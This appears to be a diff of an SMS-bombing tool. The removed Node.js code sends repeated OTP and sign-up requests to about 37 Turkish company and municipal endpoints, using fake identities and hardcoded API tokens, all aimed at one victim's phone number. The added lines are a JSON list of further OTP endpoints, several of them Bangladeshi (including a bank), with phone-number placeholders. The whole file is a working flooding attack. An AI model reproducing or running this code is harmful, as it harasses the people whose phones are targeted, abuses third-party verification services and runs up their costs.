-                        "Connection": "close"
-                    },
-                    json: {
-                        "birthDate": "2/7/2000", 
-                        "carPlate": "31 ABC 31", 
-                        "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", 
-                        "name": "Memati Bas", 
-                        "otp": "", 
-                        "phoneNumber": no,
-                        "playerId": ""
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Ipragaz]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Ipragaz]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function metro(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend',
-                    headers: {
-                        "Accept": "*/*", 
-                        "Content-Type": "application/json; charset=utf-8", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "Applicationversion": "2.1.1", 
-                        "Applicationplatform": "2", 
-                        "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1", 
-                        "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", 
-                        "Connection": "close"
-                    },
-                    json: {
-                        "methodType": "2",
-                        "mobilePhoneNumber": `+90${no}`
-                    }
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Metro]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Metro]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-            
-            function happy(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone',
-                    headers: {
-                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
-                        "Accept": "application/json, text/javascript, */*; q=0.01", 
-                        "X-Requested-With": "XMLHttpRequest", 
-                        "Accept-Language": "en-US,en;q=0.9", 
-                        "Accept-Encoding": "gzip, deflate", 
-                        "Origin": "https://www.happy.com.tr", 
-                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", 
-                        "Referer": "https://www.happy.com.tr/index.php?route=account/register"
-                    },
-                    json: {
-                        "telephone": no,
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Happy]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Happy]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function komagene(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder',
-                    headers: {
-                        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
-                    },
-                    json: {
-                        "Telefon": no,
-                        "FirmaId": "32"
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Komagene]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Komagene]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function kuryemgelsin(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/',
-                    json: {
-                        "phoneNumber": no,
-                        "phone_country_code": "+90"
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [KuryemGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [KuryemGelsin]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function taksim(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://service.taksim.digital/services/PassengerRegister/Register',
-                    headers: {
-                        "Accept": "*/*", 
-                        "Content-Type": "application/json; charset=utf-8", 
-                        "Accept-Encoding": "gzip, deflate, br", 
-                        "Accept-Language": "tr-TR,tr;q=0.9", 
-                        "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
-                        "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="
-                    },
-                    json: {
-                        "countryPhoneCode": '+90',
-                        "name": "Memati",
-                        "phoneNo": no,
-                        "surname": "Bas",
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Taksim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Taksim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function toptanteslim(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://toptanteslim.com:443/Services/V2/MobilServis.aspx',
-                    headers: {
-                        "Content-Type": "application/x-www-form-urlencoded", 
-                        "Accept": "application/json", 
-                        "Mode": "no-cors", 
-                        "U": "e-ticaret",
-                        "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
-                        "Accept-Language": "tr-TR,tr;q=0.9", 
-                        "Accept-Encoding": "gzip, deflate, br"
-                    },
-                    json: {
-                        "ADRES": "ZXNlZGtm", 
-                        "DIL": "tr_TR", 
-                        "EPOSTA": `${faker.internet.email()}`,
-                        "EPOSTA_BILDIRIM": true, 
-                        "ILCE": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R", 
-                        "ISLEM": "KayitOl", 
-                        "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", 
-                        "KIMLIKNO": null, 
-                        "KULLANICI_ADI": "Memati", 
-                        "KULLANICI_SOYADI": "Bas", 
-                        "PARA_BIRIMI": "TL", 
-                        "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", 
-                        "POSTAKODU": "377777", 
-                        "SEHIR": "\xc4\xb0STANBUL", 
-                        "SEMT": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.", 
-                        "SMS_BILDIRIM": true, 
-                        "TELEFON": no,
-                        "TICARI_UNVAN": "kdkd", 
-                        "ULKE_ID": 1105, 
-                        "VERGI_DAIRESI": "sjje", 
-                        "VERGI_NU": ""
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [ToptanTeslim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [ToptanTeslim]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function starbucks(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://auth.sbuxtr.com:443/signUp',
-                    headers: {
-                        "Content-Type": "application/json", 
-                        "Operationchannel": "ios", 
-                        "Accept": "*/*", 
-                        "Accept-Encoding": "gzip, deflate, br"
-                    },
-                    json: {
-                        "allowEmail": true, 
-                        "allowSms": true, 
-                        "deviceId": "31", 
-                        "email": `${faker.internet.email()}`,
-                        "firstName": "Memati", 
-                        "lastName": "Bas", 
-                        "password": "31ABC..abc31", 
-                        "phoneNumber": no,
-                        "preferredName": "Memati"
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Starbucks]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Starbucks]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            } 
-
-            function baydoner(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp',
-                    headers: {
-                        "Content-Type": "application/json", 
-                        "Accept": "*/*", 
-                        "Accept-Language": "tr-TR,tr;q=0.9", 
-                        "Platform": "1", 
-                        "Accept-Encoding": "gzip, deflate, br", 
-                        "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"
-                    },
-                    json: {
-                        "AppVersion": "1.3.2", 
-                        "AreaCode": 90, 
-                        "City": "ADANA", 
-                        "CityId": 1, 
-                        "Code": "", 
-                        "Culture": "tr-TR", 
-                        "DeviceId": "31s", 
-                        "DeviceModel": "31", 
-                        "DeviceToken": "3w1", 
-                        "Email": `${faker.internet.email()}`,
-                        "GDPRPolicy": false, 
-                        "Gender": "Erkek", 
-                        "GenderId": 1, 
-                        "LoyaltyProgram": false, 
-                        "merchantID": 5701, 
-                        "Method": "",
-                        "Name": "Memati", 
-                        "notificationCode": "31", 
-                        "NotificationToken": "31", 
-                        "OsSystem": "IOS", 
-                        "Password": "31Memati31", 
-                        "PhoneNumber": no,
-                        "Platform": 1, 
-                        "sessionID": "31", 
-                        "socialId": "", 
-                        "SocialMethod": "", 
-                        "Surname": "Bas", 
-                        "TempId": 942603, 
-                        "TermsAndConditions": false
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [BayDöner]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [BayDöner]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-                function pidem(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://restashop.azurewebsites.net:443/graphql/',
-                        headers: {
-                            "Accept": "*/*", 
-                            "Origin": "https://pidem.azurewebsites.net", 
-                            "Content-Type": "application/json", 
-                            "Authorization": "Bearer null", 
-                            "Referer": "https://pidem.azurewebsites.net/", 
-                            "Accept-Language": "tr-TR,tr;q=0.9", 
-                            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", 
-                            "Accept-Encoding": "gzip, deflate, br"
-                        },
-                        json: {
-                            "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": no}
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Pidem]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Pidem]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-                function bodrumbelediyesi(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://gandalf.orwi.app:443/api/user/requestOtp',
-                        headers: {
-                            "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
-                        },
-                        json: {
-                            "gsm": "+90"+no,
-                            "source": "orwi"
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [BodrumBelediyesi]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [BodrumBelediyesi]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-            function frink(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://api.frink.com.tr:443/api/auth/postSendOTP',
-                    headers: {
-                        "Accept": "*/*", 
-                        "Content-Type": "application/json", 
-                        "Authorization": "", 
-                        "Accept-Encoding": "gzip, deflate, br", 
-                        "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", 
-                        "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", 
-                        "Connection": "close"
-                    },
-                    json: {
-                        "areaCode": "90", 
-                        "etkContract": true, 
-                        "language": "TR", 
-                        "phoneNumber": "90"+no,
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Fring]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Fring]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-            function dominos(no) {
-                if (dataSb.success >= dataSb.amount) return systemFinished();
-                dataSb.total++;
-                request.post({
-                    url: 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode',
-                    headers: {
-                        "Content-Type": "application/json;charset=utf-8", 
-                        "Accept": "application/json, text/plain, */*", 
-                        "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", 
-                        "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", 
-                        "Appversion": "IOS-7.1.0", 
-                        "Accept-Encoding": "gzip, deflate, br", 
-                        "Accept-Language": "tr-TR,tr;q=0.9", 
-                        "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
-                        "Servicetype": "CarryOut", 
-                        "Locationcode": "undefined"
-                    },
-                    json: {
-                        "email": `${faker.internet.email()}`,
-                        "isSure": false, 
-                        "mobilePhone": no,
-                    },
-                    timeout: 6000
-                }, function (err, httpResponse, body) {
-                    if (httpResponse?.statusCode == 200) {
-                        dataSb.success++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.greenBright("[smsSystem] | [Dominos]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                    } else {
-                        dataSb.error++;
-                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                            chalk.redBright("[smsSystem] | [Dominos]") +
-                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                    }
-                });
-            }
-
-                function yapp(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://api.yapp.com.tr:443/api/v1/auth/phone',
-                        json: {
-                            "app_version": "1.1.2", 
-                            "code": "tr", 
-                            "device_model": "iPhone9,4", 
-                            "device_name": "", 
-                            "device_type": "I", 
-                            "device_version": "15.7.8", 
-                            "email": `${faker.internet.email()}`,
-                            "firstname": "Memati", 
-                            "is_allow_to_communication": "1", 
-                            "language_id": "1", 
-                            "lastname": "Bas", 
-                            "phone_number": no,
-                            "sms_code": ""
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Yapp]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Yapp]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-                function porty(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://api.porty.com.tr:443/api/v1/auth/phone',
-                        headers: {
-                            "Accept": "*/*", 
-                            "Content-Type": "application/json; charset=UTF-8", 
-                            "Accept-Encoding": "gzip, deflate", 
-                            "Accept-Language": "en-US,en;q=0.9", 
-                            "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
-                            "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
-                        },
-                        json: {
-                            "job": "start_login", 
-                            "phone": no,
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Porty]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Porty]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-                function clickme(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code',
-                        headers: {
-                            "Content-Type": "application/json", 
-                            "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", 
-                            "Client-Version": "1.4.0", 
-                            "Client-Device": "IOS", 
-                            "Accept-Language": "tr-TR,tr;q=0.9", 
-                            "Accept-Encoding": "gzip, deflate, br", 
-                            "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
-                        },
-                        json: {
-                            "phone": no
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Clickme]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Clickme]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-                function akbati(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://akbati-admin.poilabs.com:443/v1/tr/sms',
-                        headers: {
-                            "Accept": "*/*", 
-                            "Content-Type": "application/json", 
-                            "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", 
-                            "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", 
-                            "Accept-Encoding": "gzip, deflate, br"
-                        },
-                        json: {
-                            "phone": no
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-                function akasya(no) {
-                    if (dataSb.success >= dataSb.amount) return systemFinished();
-                    dataSb.total++;
-                    request.post({
-                        url: 'https://akasya-admin.poilabs.com:443/v1/tr/sms',
-                        headers: {
-                            "Accept": "*/*", "Content-Type": "application/json", 
-                            "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", 
-                            "User-Agent": "Akasya", 
-                            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"
-                        },
-                        json: {
-                            "phone": no
-                        },
-                        timeout: 6000
-                    }, function (err, httpResponse, body) {
-                        if (httpResponse?.statusCode == 200) {
-                            dataSb.success++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.greenBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
-                        } else {
-                            dataSb.error++;
-                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                                chalk.redBright("[smsSystem] | [Akbati]") +
-                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
-                        }
-                    });
-                }
-
-            async function send(no) {
-                kigili(no); // 1
-                kahvedunyasi(no); // 2 
-                wmf(no); // 3 |
-                tiklagelsin(no); // 4 |
-                bim(no); // 5
-                sok(no); // 6
-                migros(no); // 7
-                a101(no); // 8
-                sakasu(no); // 9
-                zarinplus(no); // 10
-                coregap(no); // 11
-                icq(no); // 12
-                naosstars(no); // 13
-                rentiva(no); // 14
-                loncamarket(no); // 15
-                kimgb(no); // 16
-                tazi(no); // 17
-                evidea(no); // 18
-                heyscooter(no); // 19
-                koton(no); // 20
-                ipragaz(no); // 21
-                metro(no); // 22
-                happy(no); // 23
-                komagene(no); // 24
-                kuryemgelsin(no); // 25
-                taksim(no); // 26
-                toptanteslim(no); // 27
-                starbucks(no); // 28
-                baydoner(no); // 29
-                pidem(no); // 30
-                bodrumbelediyesi(no); // 31
-                frink(no); // 32
-                dominos(no); // 33
-                yapp(no); // 34
-                clickme(no); // 35
-                akbati(no); // 36
-                akasya(no); // 37
-            }
-
-            for (let i = 0; i < amount; i++) {
-                await send(phone);
-                await delaySystem(1000);
-            }
-
-            async function systemFinished() {
-                if (systemFinishedT == true) return;
-                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
-                    chalk.greenBright("[smsSystem]") +
-                    chalk.blueBright(` Toplamda ${dataSb.total} adet sms gönderildi. (${dataSb.success} başarılı, ${dataSb.error} hatalı)`));
-                const result = { status: true, dataSb };
-                systemFinishedT = true;
-               return resolve(result);
-            }
-        } catch (e) {
-            console.error("Hata oluştu:", e);
-            const result = { status: false, message: "Bir hata oluştu." };
-            reject(result);
+            {
+  "info": "Get latest APIs from <https://proxy.neopandora.com/v1.json>",
+  "apis": [
+    {
+        "id": "1",
+        "name": "QuizGiri",
+        "url": "https:\/\/developer.quizgiri.xyz\/api\/v2.0\/send-otp?phone=*****&country_code=+880&fcm_token=null",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
         }
-    });
-
-    const result = await queryPromise;
-    if (result.status) {
-        console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] > `) + chalk.greenBright("[smsSystem]") + chalk.blueBright(` ${phone} numarasına ${amount} adet sms gönderildi.`));
-        return { status: true, dataSb: result.dataSb };
-    } else {
-        return { status: false, message: result.message };
+    },
+    {
+        "id": "4",
+        "name": "Shudokko",
+        "url": "http:\/\/lpin.dev.mpower-social.com:6001\/usermodule\/otp_mobile\/?mobile_no=*****&email=xbomber_public%40gmail.com&verification_type=registration",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "5",
+        "name": "Web Access",
+        "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
+        "method": "post",
+        "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
+        "headers": {
+            "content-type": "application\/json",
+            "content-length": "48"
+        }
+    },
+    {
+        "id": "6",
+        "name": "CINESPOT",
+        "url": "http:\/\/www.cinespot.mobi\/api\/cinespot\/v1\/otp\/sms\/mobile-*****\/operator-All\/send",
+        "method": "GET",
+        "body": "",
+        "wait_time": 0,
+        "identifier": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "7",
+        "name": "Dhaka bank",
+        "url": "https:\/\/ezybank.dhakabank.com.bd\/VerifIDExt2\/api\/CustOnBoarding\/VerifyMobileNumber",
+        "method": "post",
+        "body": "{\r\n  \"AccessToken\": \"\",\r\n  \"TrackingNo\": \"\",\r\n  \"mobileNo\": \"*****\",\r\n  \"otpSms\": \"\",\r\n  \"product_id\": \"250\",\r\n  \"requestChannel\": \"MOB\",\r\n  \"trackingStatus\": 5\r\n}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "8",
+        "name": "CIRCLE",
